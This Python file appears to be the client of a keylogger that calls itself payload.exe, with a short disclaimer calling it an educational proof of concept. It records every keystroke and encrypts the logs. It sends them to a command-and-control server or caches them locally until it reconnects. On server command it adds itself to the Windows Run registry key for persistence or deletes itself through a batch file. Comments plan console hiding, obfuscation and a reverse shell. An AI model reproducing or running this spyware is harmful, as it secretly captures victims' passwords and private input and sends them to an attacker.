import base64
import socket
import time
import threading
import sys
import os
import winreg
from cryptography import fernet  # Will require cryptography module.
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.hazmat.primitives.serialization import PublicFormat
from cryptography.hazmat.primitives import serialization
import keyboard  # Will require the keyboard module.

# *** Notes ***
# Add a root CA to ensure the app is communicating with correct server.
# Try to make the app find the IP address by going to an image or something discrete like steganography.
# Now local log key is working.
# Try to phase out the encrypt/decrypt functions for and use objects instead.
# Improve the key displays.
# Want to save the key to local file and re-use until connection is re-established with server.test1
# Also need it to send any cached local data.

# This is only a proof of concept and for educational purposes. Please do not use with mal-intent.

class Client:
    def __init__(self):
        self.server_ip = socket.gethostname()
        self.server_ip = socket.gethostbyname(self.server_ip)
        self.server_port = 11111
        self.log = ''  # Will log key strokes in RAM.
        # Also sends every 5 minutes.
        self.header_size = 1024  # All transactions will be 1KB to avoid traffic.
        self.kill_switch = 'XXX'  # Kill switch to kill program from server.
        self.winreg_command = 'WRG'
        self.self_destruct_command = 'DST' # #Self destruct will uninstall the exe.
        self.send_time = 15  # Seconds in log transfer cycle. Should be adjustable from server side.
        self.kill_switch_flag = False  # Flag that controls kill switch exec.
        self.connected = False  # Dictates that client is connected to controlServ.
        self.stop_log = False  # Used as mutex for key scanning and outputting key.
        self.local_flag = False  # Flag that informs if local log has data.
        #self.key = 'NAtH3cpCG6MUvDz9qYVMd83lkQFnHqAYClAuWZHHvg8='  # Key to encrypt/decrypt
        self.key = None
        self.local_key = None
        self.local_crypt_obj = None
        self.crypt_obj = None
        self.local_path = 'rgb123.txt'
        self.local_key_path = 'local_key.txt'
        # hide_console()
        # add_to_reg()
        # create_hidden_dir()
        start_log = threading.Thread(target=self.start_logging)
        start_log.start()
        send_minutely = threading.Thread(target=self.send_minute_log)
        send_minutely.start()
        self.client_socket = self.connect_to_server()
        kill_switch = threading.Thread(target=self.scan_commands)
        kill_switch.start()
        # Can scan system here.
        #  create reverse shell.
        kill_switch.join()
        send_minutely.join()
        start_log.join()

    def connect_to_server(self):  # Connects t Control center.
        while not self.connected and not self.kill_switch_flag:  # If not connected and not kill switched.
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect((self.server_ip, self.server_port))
                self.key_exchange()
                self.send_connection_type()
            except ConnectionRefusedError: # Will try to connect to server every 10 seconds.
                print('FAILED TO CONNECT. RETRYING...')
                time.sleep(10)

        return self.client_socket

    def send_connection_type(self):  # Sends its connection type (PLD-PAYLOAD) to control server.
        connection_type = self.crypt_obj.encrypt('PLD'.encode('utf-8'))
        self.send(connection_type) # Sends payload command
        confirmation = self.receive()
        confirmation = self.decrypt(confirmation).decode()
        if confirmation == 'PLD':  # If server returned the confirmation code
            self.connected = True

    def send_minute_log(self):  # Will send the keystrokes of client at defined intervals.
        while not self.kill_switch_flag:
            time.sleep(self.send_time)  # Sends log to control center every interval.
            self.send_log()  # Will return if no log data or not connected
            if not self.connected:
                connect = threading.Thread(target=self.connect_to_server)
                connect.start()
                self.local_log()
        self.connected = False

    def onkeypress(self, event):  # Handles key press event.
        if event:
            self.stop_log = True
            if event.name == 'enter':
                self.log += f"\n"
            elif event.name == 'space':
                self.log += " "
            elif event.name == 'backspace':
                self.log += f"[{event.name}]"
            elif event.name == 'tab':
                self.log += f"\t"
            elif event.name == 'caps lock':
                self.log += f"[{event.name}]"
            else:
                self.log += event.name

    def start_logging(self):  # Starts logging process.
        keyboard.on_press(self.onkeypress)
        while not self.kill_switch_flag:
            end = False
            while not end:
                time.sleep(.004)  # 4ms average polling time of keyboard.
                if self.stop_log:
                    end = True
        self.connected = False

    def init_local_key(self):
        if self.local_key is None:  # If not local key is loaded into memory
            if not self.find_local_key() : # If there is not a local key saved to storage.
                print('NO LOCAL KEY')
                self.local_key = fernet.Fernet.generate_key()  # Generates a private key to use for local log. Will send to server when connected.
                file_handle = open(self.local_key_path, 'w')
                print(f'NEW KEY = {self.local_key.decode("utf-8")}')
                file_handle.write(self.local_key.decode('utf-8'))
                file_handle.close()
        self.local_crypt_obj = fernet.Fernet(self.local_key)

    def local_log(self):  # Stores log in local file for later transmission.

        self.init_local_key()
        while not self.kill_switch_flag and not self.connected:  # Starts interval logging to local
            file_path = open(self.local_path, 'a', newline='\n')
            # file while not connected.
            time.sleep(self.send_time)  # Sends log to control center every interval.
            if self.log:
                out = self.local_crypt_obj.encrypt(self.log.encode('utf-8')).decode('utf-8')  # Encrypts with local key.
                file_path.write(out + '\n')  # Writes to local file.
                file_path.close()
                self.local_flag = True  # Lets program know there is local log data.
                self.log = ''
            file_path.close()
        self.send_log()

    def find_local_key(self):  # Will check if local key is available to append local log.
        try:
            local_key_file = open(self.local_key_path, 'r')
            self.local_key = local_key_file.read().encode('utf-8')
            return True  # Found key
        except FileNotFoundError:
            return False  # No found key

    def find_local_data(self):  # Searches for local text file to send.
        if os.path.exists(self.local_path):
            return True
        else:
            return False

    def send_log(self):  # Does the actual log sending to server. Splits it when there is local log so to not store all the contents into RAM.
        if not self.connected:  # If no log data or not connected to server return.
            return
        if self.local_flag or self.find_local_data():  # If there is log data in local storage. Send it to server.
            try:
                self.init_local_key()
                file_handle = open(self.local_path, 'r')
                command = self.crypt_obj.encrypt('LCL'.encode())
                self.send(command)  # Sends a command to server that it has local log to send.
                print(f'LOCAL KEY = {self.local_key}')

                if type(self.local_key) != bytes:
                    self.local_key = self.local_key.encode('utf-8')
                local_key_encrypted = self.crypt_obj.encrypt(self.local_key)  # Encrypts the key.
                self.send(local_key_encrypted)  # Sends the encrypted local key to server.
                file_content = file_handle.read()
                file_content = file_content.encode()
                self.send(file_content)
                # for line in file_handle:
                #     encrypted_log = line  # Being written to file as encrypted
                #     if not encrypted_log:  # If no log data.
                #         print('NO LOG')
                #         return
                #     encrypted_log = encrypted_log.encode('utf-8')
                #     self.send(encrypted_log)  # Sends the local log that is encrypted with local key.
                #     time.sleep(.10)  # Small delay to not cause slow down of user experience.
                file_handle.close()
                self.local_key = None
                os.remove(self.local_key_path)
                os.remove(self.local_path)

            except FileNotFoundError:
                print("FILE NOT FOUND")
            self.local_flag = False

        else:   # Normal flush of the log in memory to command and control.
            if not self.log:
                return
            encrypted_log = self.crypt_obj.encrypt(self.log.encode('utf-8'))
            self.send(encrypted_log)
            self.log = ''

    def decrypt(self, data):
        if type(data) != bytes:
            data = data.encode()
        decrypted_obj = fernet.Fernet(self.key)
        data = decrypted_obj.decrypt(data)
        return data

    def receive(self):  # Receives data from control server.
        try:
            incoming_size = self.client_socket.recv(self.header_size).decode('utf-8')  # Gets size of payload
            time.sleep(.10)
            payload = self.client_socket.recv(int(incoming_size))  # Gets payload
            return payload
        except ConnectionResetError:
            self.connected = False
            return
        except OSError:
            self.connected = False
            return

    def scan_commands(self):  # Will wait for  signal from server and call appropriate action.
        signal = ''
        while not self.kill_switch_flag:
            signal = self.receive()
            if type(signal) == bytes:
                signal = signal.decode('utf-8')
            if signal == self.kill_switch:
                self.kill_switch_flag = True
            elif signal == self.winreg_command:
                self.add_winreg()
                self.send(self.winreg_command.encode('utf-8')) # Sends confirmation to server that it performed command.
            elif signal == self.self_destruct_command:  # Only works when payload.exe is running as user.
                current_file_dir = os.getcwd() + '\payload.exe'
                print(f'curr_dir = {current_file_dir}')
                batch_file = open('remove.bat', 'w')
                batch_file.write(f'''TASKKILL /F /IM "payload.exe" 
DEL "{current_file_dir}"''')
                batch_file.close()
                os.startfile(r'remove.bat')
                # Call batch file
                # Batch will remove program

    def add_winreg(self):
        curr_directory = os.getcwd() + '\payload.exe'
        REG_PATH = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, 'payload_startup', 0, winreg.REG_SZ, curr_directory)
        winreg.CloseKey(registry_key)


    def send(self, payload):
        log_size = str(sys.getsizeof(payload)).encode('utf-8')
        log_size += b' ' * (self.header_size - sys.getsizeof(log_size))
        try:
            self.client_socket.send(log_size)
            time.sleep(.10)
            self.client_socket.send(payload)
        except ConnectionResetError:  # If network is not active.
            self.connected = False
            return
            # Use hidden directory and obfuscation.
        except OSError:
            self.connected = False
            return


    def key_exchange(self):
        private_key = ec.generate_private_key(ec.SECP384R1())
        public_key = private_key.public_key()
        self.send(public_key.public_bytes(encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo))  # Using public bytes to serialize the key for transfer to server.
        server_public_key = self.receive()
        server_public_key = serialization.load_pem_public_key(server_public_key)
        shared_key = private_key.exchange(ec.ECDH(), server_public_key)
        derived_key = HKDF(
            info=None,
            length=32,
            salt=None,
            algorithm=hashes.SHA256()
        ).derive(shared_key)
        derived_key = base64.urlsafe_b64encode(derived_key)
        self.key = derived_key
        self.crypt_obj = fernet.Fernet(self.key)
        print(f'SERVER KEY = {derived_key.decode()}')


start = Client()


